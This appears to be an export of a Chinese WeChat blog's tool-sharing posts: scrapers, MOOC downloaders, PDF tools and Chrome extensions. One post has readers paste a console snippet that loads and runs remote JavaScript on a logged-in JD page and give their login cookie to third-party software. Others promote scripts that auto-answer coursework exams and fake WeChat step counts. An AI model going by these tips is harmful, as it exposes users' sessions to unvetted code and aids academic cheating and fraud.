'score':item.select('div.info &gt; div.bd &gt; div.star &gt; span.rating_num')[0].text, 'desc':desc, &#125;)#&#123;'url': 'https://movie.douban.com/subject/1292052/', 'title': '肖申克的救赎', 'rank': '1', 'score': '9.7', 'desc': '希望让人自由。'&#125; return dataif __name__ == '__main__': urls = ['https://movie.douban.com/top250?start=&#123;0&#125;&amp;filter='.format(i * 25) for i in range(10)] movie_list = [request_url(url) for url in urls] movie_list = [] for url in urls: movie_list.append(request_url(url)) time.sleep(1) movie_url_list = [movie_info(movie) for movie in movie_list] data = [] for j in movie_url_list: for k in j: data.append(k) print(data) df = pd.DataFrame(data) df.to_csv("douban_movies.csv",encoding="utf_8_sig",index=False) 执行 Python 脚本后会生成一个CSV文件，不过有些电影没有简介 ，比如周星驰的《九品芝麻官》https://movie.douban.com/subject/1297518/ web scraper 抓取豆瓣电影这是一款免费的Chrome扩展，只要建立sitemap即可抓取相应的数据，无需写代码即可抓取95%以上的网站数据（比如博客列表，知乎回答，微博评论等）， Chrome扩展地址 https://chrome.google.com/webstore/detail/web-scraper-free-web-scra/jnhgnonknehpejjnehehllkliplmbmhn ，如果你上不了谷歌在公众号后台回复 Python 获取我下载好的crx文件，先改文件名后缀为.rar，解压到一个目录中，然后加载已解压的扩展程序即可安装成功。 使用web scraper抓取数据步骤为 创建 sitemap，新建 selector （抓取规则），启动抓取程序，导出 csv文件 。 打开谷歌浏览器控制台，可以看到多了个web scraper 标签，下面有sitemaps，sitemap，create new sitemap ，点击create新建一个爬虫抓取任务。 豆瓣电影的分页链接为 https://movie.douban.com/top250?start=0&amp;filter=，共10页，所以URL填入 https://movie.douban.com/top250?start=[0-250:25]&amp;filter= ，name随意填一个。然后点击add new selector 添加新的选择器。给id起个名，type为 element ，点击 select 选中第一部电影《肖申克的救赎》，可以看到网页标红了。然后再选择第二条，可以看到下面的电影都选中了，点击 done selecting 就好了。 ps：抓取到的选择器其实就是css结构，右键copy selector也可以看到。 接着点击 element preview 预览下可以看到电影元素都抓取到了，因为一页有多部电影还要选中 Multiple 。然后进入刚才建的 element 里新加选择器。共有5个选择器，分别为电影名，豆瓣链接，电影排名，电影简介，豆瓣评分。可以预览下新建的电影名选择器看看效果。 点击selector graph 可以看到抓取的选择器关系图。选择器都建好后点击 scrape 开始抓取数据了。浏览器自动弹出窗口抓取数据，不用管它，抓取完后它会自动关闭。很快抓取完了。再预览下抓取的数据是否正常。确认没问题后点击 export data as CSV 导出CSV文件。打开生成的CSV文件，可以看到抓取的电影排序乱了。没关系，选中电影排名这列，选择升序排列。最后抓取的250条豆瓣电影数据结果就是这样了。 最后可以export sitemap 导出这个爬虫任务，是个json格式字符串，你可以直接复制我这个导入直接抓取豆瓣电影数据。 1&#123;"_id":"douban","startUrl":["https://movie.douban.com/top250?start=[0-250:25]&amp;filter="],"selectors":[&#123;"id":"row","type":"SelectorElement","parentSelectors":["_root"],"selector":".grid_view li","multiple":true,"delay":0&#125;,&#123;"id":"电影名","type":"SelectorText","parentSelectors":["row"],"selector":"span.title","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"豆瓣链接","type":"SelectorLink","parentSelectors":["row"],"selector":".hd a","multiple":false,"delay":0&#125;,&#123;"id":"电影排名","type":"SelectorText","parentSelectors":["row"],"selector":"em","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"电影简介","type":"SelectorText","parentSelectors":["row"],"selector":"span.inq","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"豆瓣评分","type":"SelectorText","parentSelectors":["row"],"selector":"span.rating_num","multiple":false,"regex":"","delay":0&#125;]&#125; 使用 web scraper 抓取数据就是这么简单，不用写代码也能轻松完成抓取任务，不过第一次操作还是有点难，尤其对不熟悉网页结构的小伙伴，之后有空我录制一个视频方便大家自己操作下（有问题文末评论或者加我微信交流），下面再用 web scraper 抓取b站排行榜 https://www.bilibili.com/v/popular/rank/all这里抓取视频排名，标题，播放量，弹幕数，up主，点赞数，投币数，收藏数。其中点赞数，投币数，收藏数在视频链接的二级页。 先预览下抓取的效果。最后导出的CSV文件。 为了方便你抓取，我也提供了json字符串，你可以直接导入抓取。 1&#123;"_id":"bilibili_rank","startUrl":["https://www.bilibili.com/v/popular/rank/all"],"selectors":[&#123;"id":"row","type":"SelectorElement","parentSelectors":["_root"],"selector":"li.rank-item","multiple":true,"delay":0&#125;,&#123;"id":"视频排名","type":"SelectorText","parentSelectors":["row"],"selector":"div.num","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"视频标题","type":"SelectorText","parentSelectors":["row"],"selector":"a.title","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"播放量","type":"SelectorText","parentSelectors":["row"],"selector":".detail &gt; span:nth-of-type(1)","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"弹幕数","type":"SelectorText","parentSelectors":["row"],"selector":"span:nth-of-type(2)","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"up主","type":"SelectorText","parentSelectors":["row"],"selector":"a span","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"视频链接","type":"SelectorLink","parentSelectors":["row"],"selector":"a.title","multiple":false,"delay":0&#125;,&#123;"id":"点赞数","type":"SelectorText","parentSelectors":["视频链接"],"selector":"span.like","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"投币数","type":"SelectorText","parentSelectors":["视频链接"],"selector":"span.coin","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"收藏数","type":"SelectorText","parentSelectors":["视频链接"],"selector":"span.collect","multiple":false,"regex":"","delay":0&#125;]&#125; 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键下载中国大学/网易云课堂/慕课网等课程视频和课件]]></title>
    <url>%2F2020%2F11%2F06%2F%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6-%E7%BD%91%E6%98%93%E4%BA%91%E8%AF%BE%E5%A0%82-%E6%85%95%E8%AF%BE%E7%BD%91%E7%AD%89%E8%AF%BE%E7%A8%8B%E8%A7%86%E9%A2%91%E5%92%8C%E8%AF%BE%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[苏生不惑第189 篇原创文章，将本公众号设为星标，第一时间看最新文章。 今天分享几个对学生（或者爱学习的小伙伴）有用的工具。 中国大学 MOOC 下载器一键下载中国大学 MOOC（icourse163.org）的课程，包括视频、课件、附件和字幕，方便离线观看 https://github.com/xixixixixiao/mooc-downloader先登录你的账号。勾选下载选项（视频，附件，课件，字幕），输入课程链接，比如这个课程 https://www.icourse163.org/course/USTB-1206412811 ，开始下载。很快视频和PDF文件都下载好了。 学无止下载器这个软件支持中国大学，网易云课堂，爱课程，学堂在线，慕课网5大慕课网站的视频课程下载 https://github.com/PyJun/Mooc_Downloader ，登录账号后使用命令行形式下载。 输入视频课程地址https://www.icourse163.org/course/USTB-1206412811，不用登录即可下载。跟刚才的软件一样下载好了。 刷网课工具这个工具支持智慧职教 https://mooc.icve.com.cn/ ，中国大学慕课https://www.icourse163.org/ 一键秒刷课（公众号后台回复 学习 获取软件），修改学习时长，查询题库答案。 除了软件还有油猴脚本https://greasyfork.org/zh-CN/scripts/396813 ，关于油猴脚本安装和使用见之前文章 实用油猴脚本推荐，让你的谷歌浏览器更强大 https://github.com/Avenshy/WELearnToSleep 这个工具支持随行课堂 https://welearn.sflep.com 一键完成课程 。 它也有对应的油猴脚本 https://greasyfork.org/scripts/407589 ，如果还想做题使用这个脚本 https://greasyfork.org/zh-CN/scripts/398601 ，它能显示随行课堂题目答案，口语&amp;听力参考，支持班级测试，自动答题。 再分享几个学习网站。 学习网站国家级精品资源在线开放课程，包括北大、清华、人民大学等共2686门课程http://www.icourses.cn/cuoc/ 库问搜索 ，千万级文献无需注册免费下载 http://www.koovin.com/ 在线公开课搜索引擎 http://www.coursade.com/ ，目前提供51163门在线课程。 一个完全免费的在线学习网站大学资源网，提供了丰富的学习视频教程 http://www.dxzy163.com/ 内置了计算机等级考试以及驾照考试的庞大题库网站问题库 https://questionlib.net/ 便捷的网课查题平台简答题 http://www.jiandati.com/ ，类似的还有https://www.daandaan.com/ ，https://www.asklib.com/ 一个以外语为主的慕课平台，汇聚了国内外各大高校的优质外语课程 http://moocs.unipus.cn/ 最后分享几个油猴脚本： 超星网课助手，自动挂机看尔雅MOOC，支持视频、音频、文档、图书自动完成，章节测验自动答题提交，支持自动切换任务点、挂机阅读时长、自动登录等，解除各类功能限制，开放自定义参数 https://greasyfork.org/zh-CN/scripts/369625 超星慕课刷课工具，全自动任务,视频倍速秒过,作业考试题库,验证码自动打码 https://greasyfork.org/zh-CN/scripts/376190 知网下载助手，解析CNKI论文PDF格式下载地址，论文搜索结果页面和硕博论文详述页面的caj格式下载链接替换为pdf格式下载链接，知网空间页面增加pdf格式下载链接 https://greasyfork.org/zh-CN/scripts/371938 一键下载 SCI 文献 https://greasyfork.org/en/scripts/370246-sci-hub-button 最近文章： 2020年10月福利，小伙伴们来领现金红包 良心整理：PDF工具合集 2020 最全电子书搜索网站，找电子书不再愁 如何通过电影截图找到电影 集赞生成器：朋友圈集赞不求人 2020微信运动一键刷步数，让你重回排行榜第一 2020 双 11 京东全民营业一键自动做任务 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[良心整理，PDF处理工具合集]]></title>
    <url>%2F2020%2F11%2F06%2F%E8%89%AF%E5%BF%83%E6%95%B4%E7%90%86%EF%BC%8CPDF%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第188篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过在线办公神器： 那些你可能用得上的在线办公神器 那些你可能用得上的在线办公神器（二） 这里再整理下PDF处理工具。 smallpdf 功能一应俱全、简单好用的线上 PDF 工具 https://smallpdf.com/cn这里转换PDF为Word 测试下，使用我之前下载的公众号文章PDF 。 转换后的Word样式，效果还行，它还提供Chrome扩展插件 https://chrome.google.com/webstore/detail/smallpdf-edit-compress-an/ohfgljdgelakfkefopgklcohadegdpjf ，安装Chrome扩展插件方法见之前文章上不了谷歌如何安装 Chrome 扩展？可惜每天只有2次免费使用额度。 addpdfhttps://www.addpdf.cn/ PDF和Word互转。这个转换Word后除了格式有点乱还不错。 pdfcandyhttps://pdfcandy.com/cn/ 免费的在线PDF 编辑器，功能很全，还提供Windows版本。 pdf2gohttps://www.pdf2go.com/zh 免费的在线PDF转换器。 ilovepdfhttps://www.ilovepdf.com/zh-cn 完全免费、易于使用的PDF处理工具，功能包括：合并、拆分、压缩、转换、旋转和解锁以及给PDF文件添加水印。 pdf2doc https://pdf2doc.com/zh/ PDF转换器。 easypdfhttps://easypdf.com/cn 为所有人制作的在线PDF转换器。 extractpdfhttps://www.extractpdf.com/zh.html 从PDF文件中提取图像，文本和字体。 PDF派https://www.pdfpai.com/ 20个好用的PDF在线工具，完全免费。 office-converterhttps://cn.office-converter.com/pdf-tools 在线文件转换器，所有都是100％免费且易于使用。 Ocrall https://www.ocrall.com/convert/ PDF解密，去水印，转Word，还原率高达99% ，不过有点麻烦，不能在线处理， 需要发邮件给他们，等他们回复你。 simpdfhttps://simpdf.com/ 简单易用的开源 PDF在线编辑器，可直接在网页上对 PDF 文件进行解析编辑，并保留其文件结构及格式 https://github.com/shashanoid/Simpdf 把pdf文件上传上去，就可以像word文档一样编辑pdf https://simpdf.com/editor 还有下面这些就不一一介绍了。123456789101112http://www.alltoall.net/ https://www.hipdf.cn/ https://pdf.to http://tools.pdf24.org/zh/ https://topdf.com/zh/ https://www.aconvert.comhttps://convertio.co/zh/https://lightpdf.com/zh/ https://www.pdftoword.com/ https://pdf.to/ https://www.pdfconverter.com/ https://cloudconvert.com/pdf-to-doc 最后分享3个PDF软件（公众号后台回复 PDF 获取）。 全能PDF工具箱免安装，解压即可用，功能有PDF转文本，图片，doc，文档合并，分割，重命名，设置密码，解锁，提取文本，ocr，图片，添加图片，文本。转换速度也很快，效果也不错。 PDF阅读器SumatraPDF 这个比较简洁，无广告。其实也可以使用谷歌浏览器来阅读PDF文件。 万兴PDF专家秒会的全能PDF编辑器，免安装使用。比如编辑PDF。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 双 11 京东全民营业一键自动做任务]]></title>
    <url>%2F2020%2F10%2F30%2F2020-%E5%8F%8C-11-%E4%BA%AC%E4%B8%9C%E5%85%A8%E6%B0%91%E8%90%A5%E4%B8%9A%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%81%9A%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[苏生不惑第188 篇原创文章，将本公众号设为星标，第一时间看最新文章。 又快到了一年一度的双十一，你是不上班/上课时摸鱼做京东/淘宝的双11任务，分享几个工具帮你解放双手，自动帮你做任务领金币。 自动做任务软件版这是一个Windows下的软件 （公众号后台回复 京东 获取），打开软件登录自己的京东账号，可以扫码或者使用cookie登录，我这里用的cookie登录演示，浏览器使用手机模式打开 http://m.jd.com 登录京东账号。 复制请求的cookie ，比较长的一段字符。 登录成功后可以看到你的账号信息。点击一键做任务。打开京东APP看看（我只做了一部分）。如果是多账号使用这个软件 。 自动做任务网页版浏览器打开 http://m.jd.com 登录京东账号，然后使用手机模式打开活动地址 https://bunearth.m.jd.com/babelDiy/Zeus/4SJUHwGdUQYgg94PFzjZZbGZRjDd/index.html#/home ，打开控制台复制以下代码按回车键执行。1javascript:!function()&#123;function c()&#123;var d=document.getElementById("loadJs"),e=document.createElement("script");d&amp;&amp;document.getElementsByTagName("head")[0].removeChild(d),e.id="loadJs",e.type="text/javascript",e.onerror=function()&#123;return b==a.length-1?(alert("%E5%8A%A0%E8%BD%BD%E5%A4%B1%E8%B4%A5%EF%BC%81%E8%AF%B7%E7%A8%8D%E5%90%8E%E5%86%8D%E5%B0%9D%E8%AF%95%E5%90%A7%EF%BC%81"),void 0):(b++,c(),void 0)&#125;,e.src=a,document.getElementsByTagName("head")[0].appendChild(e)&#125;var a=[`https://krapnik.cn/tools/JDCouponAssistant/bundle.js?_=$&#123;new Date().getTime()&#125;`],b=0;c()&#125;(); 跳转到一个新页面。点击控制台下方按钮 more tools 里选择 network conditions 点击一键复制User-Agent 填入network conditions 下的 user agent，再次执行刚才的代码。 然后可以看到每天签到，逛主会场等功能，挨个点击执行任务。 自动做任务安卓版这个需要安装 auto.js APP ，再导入脚本文件自动做任务，详情见 淘宝+京东双十一活动脚本（微信里文末点击阅读原文查看） https://github.com/hyue418/taobao-11-11 ，支持淘宝\支付宝\京东双11任务自动执行，作者提供了下载地址，就是操作有点麻烦。 京价保Chrome扩展如果你经常使用京东，推荐这个帮助你自动申请京东价格保护，自动签到领京豆，自动领取优惠券的chrome拓展https://chrome.google.com/webstore/detail/%E4%BA%AC%E4%BB%B7%E4%BF%9D-%E4%BA%AC%E4%B8%9C%E4%BB%B7%E4%BF%9D%E5%8A%A9%E6%89%8B/gfgkebiommjpiaomalcbfefimhhanlfd ，主要功能有：1234自动监控最近订单商品的价格变化，在商品降价时自动申请价格保护京东商品价格走势图监控购物车降价自动签到领取京豆 iPhone12 刚出来，是不很难预约到，分享个Apple Store 预约助手，提供Windows和Mac软件 ，选择门店和型号，点击 添加 到监控列表，匹配到之后会暂停监听，详情见 https://github.com/hteen/apple-store-helper 。 最后说下，管住自己的手， 不买就是赚 。 最近文章： 中秋/国庆节发福利了，小伙伴们来领现金红包 如何让你的搜索更高效 2020 最全电子书搜索网站，找电子书不再愁 如何通过电影截图找到电影 集赞生成器：朋友圈集赞不求人 2020年10月最新免费加速下载百度网盘文件方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020微信运动一键刷步数，让你重回排行榜第一]]></title>
    <url>%2F2020%2F10%2F30%2F2020%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%B8%80%E9%94%AE%E5%88%B7%E6%AD%A5%E6%95%B0%EF%BC%8C%E8%AE%A9%E4%BD%A0%E9%87%8D%E5%9B%9E%E6%8E%92%E8%A1%8C%E6%A6%9C%E7%AC%AC%E4%B8%80%2F</url>
    <content type="text"><![CDATA[苏生不惑第187 篇原创文章，将本公众号设为星标，第一时间看最新文章。 微信运动很久之前就有了，不过我是最近才开始玩的，你的微信运动排行榜里是不总有人长期霸占第一，他应该不是每天都在运动，很可能是使用了工具刷的，今天就分享下。 在线刷微信运动步数首先在应用商店下载一个乐心健康app http://www.lifesense.com/app/ ，使用手机号注册，并且设置一个登陆密码，然后在数据共享里开启第三方同步（包含微信运动，支付宝运动，阿里体育，需要关注他们的公众号绑定你的微信）。刷步数前我是5448，排行219。然后打开网站https://shuabu.yimouleng.com/（网站可能会随时挂掉，公众号后台回复 微信 获取） ，输入你的账号，密码和步数（注意微信要小于98800）。 回到微信运动排行榜（支付宝一样的），很快我就排第一霸占了封面。 这个网站的原理其实就是利用乐心健康的接口刷步数，然后同步到你绑定的微信运动，如果网站挂了可以自己弄一个。 如果你想每天自动刷，有人已经开发好了工具 https://github.com/CasterWx/lexin ，就是利用GitHub的action每天自动调用乐心健康的接口帮你刷步数。 每天自动刷微信运动首先你要有个GitHub账号，然后fork那个仓库，在Seeting secrets 添加3个变量USERNAME 用户名，PASSWORD 密码，STEP 目标步数。 然后调整每天刷的时间，时间格式可以参考 https://crontab.guru/ 自己调整。 注意GitHub的cron时间是 utc 时间，换成北京时间要加8小时。设置好后点击run，测试成功，之后就让GitHub每天给你刷步数，不过建议不要刷的太狠，否则你的好友可能把你屏蔽了。 如果你还想刷网易云音乐听歌数，快速升级账号可以看看之前文章网易云音乐等级快速升级：每天自动打卡听歌300首 ，我用腾讯云函数帮几十位小伙伴每天自动打卡，有人已经满级了。 我的账号也听了快1万首歌了。马上到4级。 最近文章： Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 中秋/国庆节发福利了，小伙伴们来领现金红包 如何让你的搜索更高效 2020 最全电子书搜索网站，找电子书不再愁 如何通过电影截图找到电影 集赞生成器：朋友圈集赞不求人 2020年10月最新免费加速下载百度网盘文件方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣/实用的 Chrome 扩展神器]]></title>
    <url>%2F2020%2F10%2F30%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3-%E5%AE%9E%E7%94%A8%E7%9A%84-Chrome-%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[苏生不惑第186 篇原创文章，将本公众号设为星标，第一时间看最新文章。 谷歌浏览器一直是我推荐的浏览器，之前也写过几篇文章： 如何让你的搜索更高效 实用油猴脚本推荐，让你的谷歌浏览器更强大 谷歌浏览器安装的 Chrome 扩展越来越多，怎么管理？ Chrome 浏览器扩展神器油猴 请停用以开发者模式运行的扩展程序？搞定谷歌浏览器插件弹窗 上不了谷歌如何安装 Chrome 扩展？ Chrome 浏览器扩展神器暴力猴 那些你可能不知道的谷歌浏览器实用技巧 最近发现谷歌浏览器地址栏可以显示https前缀了，右键选择总是显示完整网址就行了。网址显示全了 https://www.google.com.hk 这里再推荐几个有趣/实用的 Chrome 扩展神器，都是我经常使用的。 二管家这是一个管理扩展的扩展 ，可以获取扩展更新通知并记录拓展历史，自动开启/关闭拓展，根据当前网站获取二管家社区推荐，Chrome 扩展地址 https://chrome.google.com/webstore/detail/nooboss/aajodjghehmlpahhboidcpfjcncmcklf ，安装Chrome扩展方法见之前文章 上不了谷歌如何安装 Chrome 扩展？ ，如果你安装了很多扩展浏览器可能会有点卡顿，推荐使用这个扩展管理起来。 二管家能干什么？ 选项里可以设置主题和开启关闭某些设置。 历史页面可以看到每个扩展的安装、卸载、开启、关闭等记录。还有更新通知。 扩展只在指定网页才启用，比如只有打开百度网盘页面才开启网盘助手扩展。 识别浏览器播放歌曲这首歌是什么？ 在播放音频的页面上只需点击 AHA Music 的图标，它就会自动识别当前正在播放音乐的歌曲名称、艺术家姓名，并给出 Spotify、YouTube、Deezer 等流媒体服务链接，精准识别，准确率高，曲库覆盖全，扩展地址https://chrome.google.com/webstore/detail/aha-music-song-finder-for/dpacanjfikmhoddligfbehkpomnbgblf 比如网易云音乐这首周杰伦的《晴天》https://music.163.com/#/song?id=186016 ，播放后点击图标就能识别出来（想知道为什么我能播放无版权歌曲看看之前文章一键解锁网易云音乐变灰歌曲）点击YouTube图标跳转到详情页 https://www.aha-music.com/%E5%91%A8%E6%9D%B0%E5%80%AB-%E6%99%B4%E5%A4%A9-9649d019f5636c150239c6ffc8866663?utm_source=chrome&amp;utm_medium=extension 导出公众号文章链接关于导出公众号文章之前写过文章一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 ，如果你不会使用Python推荐这个Chrome 插件（由于没有上架谷歌商店，公众号后台回复 公众号获取），支持文章列表导出为 CSV文件。 https://wwx.lanzoux.com/ijSp6hrf3if 先在微信客户端开启用浏览器打开网页。 打开一篇文章，然后点击扩展图标会跳转到详情页 https://mp.weixin.qq.com/mp/profile_ext?action=home&amp;__biz=MzIyMjg2ODExMA==&amp;scene=124&amp;#wechat_redirect，点击scroll start 页面会自动下拉。 然后点击 export as csv 导出csv文件，不过Windows下会乱码，因为 WPS和 Excel 无法识别 UTF-8 编码的 csv 文件，可以手动把编码由 UTF-8 改为 GBK，或者使用编辑器sublime打开 。 豆瓣账号备份这个扩展用于备份豆瓣的用户数据及图片，并支持将备份数据导出到 Excel，扩展地址 https://chrome.google.com/webstore/detail/%E8%B1%86%E4%BC%B4%EF%BC%9A%E8%B1%86%E7%93%A3%E8%B4%A6%E5%8F%B7%E5%A4%87%E4%BB%BD%E5%B7%A5%E5%85%B7/ghppfgfeoafdcaebjoglabppkfmbcjdd ，功能有12345• 备份本人或他人的豆瓣账号数据• 脱机浏览备份数据• 将备份数据导出为 Excel 文件• 将备份数据中的图片上传到 Cloudinary 云存储• 迁移备份数据到当前豆瓣帐号 点击新建任务，选择备份的项目，我这里选的豆邮。很快备份完成了。然后导出Excel文件 。 开启关闭JavaScript某些网站禁止了复制功能http://www.360doc.com/content/20/0527/21/70200776_915020058.shtml这个是前端处理的，所以可以打开控制台 disable javascript 。 当然这样有点麻烦，可以使用这个谷歌插件 https://chrome.google.com/webstore/detail/toggle-javascript/cidlcjdalomndpeagkjpnefhljffbnlo/related ，它可以禁止运行js文件，这样就可以复制了。 浏览网页时自然学外语这是一个可以让日常流量网页的过程中比较舒服地学习外语的插件 https://chrome.google.com/webstore/detail/%E5%AD%A6%E5%A4%96%E8%AF%AD/aomdloeklfjnepbopeagobbgclmghgng/ ，通过从网页内容中挑选一些词语翻译成外语，让用户可以根据上下文更好的学习和理解想要学习的外语，可以设定单词难度来学习不同难度的词语，目前支持中文用户学习英语和日语。 外链自由跳转现在微博，知乎，简书的非白名单外链是不能自由跳转的，这个插件可以帮你自动跳转https://chrome.google.com/webstore/detail/%E8%87%AA%E7%94%B1%E8%B7%B3%E8%BD%AC/ldfofldbjpkkenoichgpoikbfgplgfdd 当然也可以使用这个油猴脚本 https://greasyfork.org/zh-CN/scripts/412612-open-the-f-king-url-right-now，它支持微博/豆瓣/知乎/简书的外链自动跳转，微信公众号网页版 URL 点击跳转。 异地同步看视频+聊天一个支持远程同步看视频+聊天的 chrome 插件https://chrome.google.com/webstore/detail/synchime/emjmcfhchipmaflddbmkoojhecpfpjmo/related ，目前支持 bilibili，youtube，爱奇艺 ，腾讯视频 ，无需注册，双方直接连接，输入对方 ID 后点击连接即可，简直异地恋情侣福音。 我这里用谷歌浏览器无痕模式测试的，输入对方id连接后点击请求同步。对方同意后画面就可以同步播放了，还能聊天。 还有个可以同步看视频的播放器 https://github.com/liyang5945/sync-player 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（六）]]></title>
    <url>%2F2020%2F10%2F23%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E5%85%AD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第183篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些有趣的网站系列（四） 那些有趣的网站系列（五） 这是系列第6篇。 临时邮箱https://www.snapmail.cc/ 每次打开网站会生成一个临时邮箱https://www.snapmail.cc/#/emailList/pafhuh@snapmail.cc ，使用临时邮箱注册网站，保护个人真实邮箱。 ps: 一个 gmail 多个地址，比如abc.123@gmail.com 和 abc123@gmail.com 是同一个邮箱，域名换成 @googlemail.com，发送到任意一个地址都能收到邮件。 当你需要很多个临时邮箱的时候，推荐使用前缀邮箱，一个前缀邮箱就够了，不需要添加多次。 食物营养成分查询在线查询国内各品牌、各种食物营养成分，比如煮鸡蛋 https://www.fatsecret.cn/ 鲁迅语录查询北京鲁迅博物馆上线的一个鲁迅著作全编在线检索系统http://www.luxunmuseum.com.cn/cx/ ，以后别再想冒充鲁迅了。 鲁迅的确没说过 我没说过 。 支付宝到账声音 https://mm.cqu.cc/share/zhifubaodaozhang/?money=88.88 修改money后的参数即可生成一个支付宝到账的音乐，数字取值范围0.01~999999999999.99 ，比如https://mm.cqu.cc/share/zhifubaodaozhang/mp3/88.88.mp3 ，还可以将mp3文件下载到手机装逼用。 ASCII 艺术字符图上传图片生成ASCII 艺术字符图（右侧字符文字可选择的），可以拖动滑条看效果，还可以下载到本地 https://ascii-generator.site/ 互联网从业者薪资查询帮助互联网从业者查询薪资、级别（比如阿里腾讯百度等知名企业） http://www.salaryfly.com/ ，有点类似国外的https://www.levels.fyi/ 新闻联播文字版https://cn.govopendata.com/xinwenlianbo/ 书法拼贴生成器输入汉字生成书法拼贴图， 每次生成的不一样 http://z.topurl.cn/z/index.html#/效果图 谷歌公墓收录了目前谷歌已下线的产品207个 https://killedbygoogle.com/ 自动生成AI笔记只要上传视频文件或直接贴上视频链接，会自动识别视频的内容，生成每帧文字截图，并将语音转成文字，还能直接翻译笔记下载文档 https://videoai.perspectivar.com/ 有150分钟的免费使用额度。生成的笔记结果。 最后推荐一个轻音乐听歌站 http://nav.6soluo.com/qing.html ，收录了300首歌，想安静的时候可以听听。 最近文章： Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 中秋/国庆节发福利了，小伙伴们来领现金红包 如何让你的搜索更高效 2020 最全电子书搜索网站，找电子书不再愁 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 如何根据台词找到对应电影片段 如何通过电影截图找到电影 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以图搜图：如何通过电影截图找到电影]]></title>
    <url>%2F2020%2F10%2F16%2F%E4%BB%A5%E5%9B%BE%E6%90%9C%E5%9B%BE%EF%BC%9A%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E7%94%B5%E5%BD%B1%E6%88%AA%E5%9B%BE%E6%89%BE%E5%88%B0%E7%94%B5%E5%BD%B1%2F</url>
    <content type="text"><![CDATA[苏生不惑第182 篇原创文章，将本公众号设为星标，第一时间看最新文章。 这是公众号的第一篇付费文章（其实很早就开通了付费功能，一直没用），收费1块，保证让你看完觉得值。 之前分享过如何找电影资源 2020 最全百度网盘搜索，找电影资源不再愁 和 通过台词找电影如何根据台词找到对应电影片段 ，今天分享以图搜图，通过电影截图查找电影电视剧。 看看这张图，曾经的周杰伦也是小鲜肉。谷歌浏览器右键通过谷歌搜索图片，关于谷歌浏览器更多使用技巧见之前文章那些你可能不知道的谷歌浏览器实用技巧。很快找到这张图来自周杰伦2005年电影《头文字D》，想看周杰伦所有电影在公众号后台回复 周杰伦。 除了谷歌，百度和搜狗等搜索引擎都有识图功能，有的搜索引擎找不到就换其他的，不过这样有点麻烦，推荐使用下面的Chrome扩展和油猴脚本。 chrome 扩展chrome 扩展 search-by-image 集成Google， Bing， Yandex，Baidu，TinEye等5个以图搜图搜索引擎， 扩展地址https://chrome.google.com/webstore/detail/search-by-image/cnojnbdhbhnkbcieeekonklommdnndci/related ，安装Chrome扩展方法见之前文章上不了谷歌如何安装 Chrome 扩展？ 安装扩展后右键图片可以选择对应搜索引擎，或者全部搜索引擎查找。 国内也有类似的二箱， 它集成了Google，Bing，Yandex，Baidu，TinEye 等8个以图搜图搜索引擎。https://chrome.google.com/webstore/detail/noobox/kidibbfcblfbbafhnlanccjjdehoahep?hl=zh-CN同样是右键图片搜索，除了搜图它还有自动刷新网页和HTML5 视频控制功能。 油猴脚本关于油猴脚本之前写过很多文章了实用油猴脚本推荐，让你的谷歌浏览器更强大，Search By Image脚本集合了谷歌，百度，bing，搜狗，360等搜索引擎，脚本地址https://greasyfork.org/zh-CN/scripts/2998-search-by-image ，按住快捷键（默认设置为 Ctrl 键），同时在图片上点击鼠标右键，在菜单中选择欲使用的搜索引擎。新的搜索引擎也可以在设置里添加。 除了以上通用的搜索引擎还有些专业领域的，比如搜索动漫的 https://saucenao.com/， https://trace.moe ，后者是一个存储了大量番剧并对番剧画面进行了逐帧的索引,只要你能给出番剧的截图, 它就可以找到截图对应的番剧,以及截图对应的时间轴。 它还是开源的 https://github.com/soruly/trace.moe，提供URL参数即可查找https://trace.moe/?url=xxx 。 比如这张图 。有8万多搜索结果，可以搜到 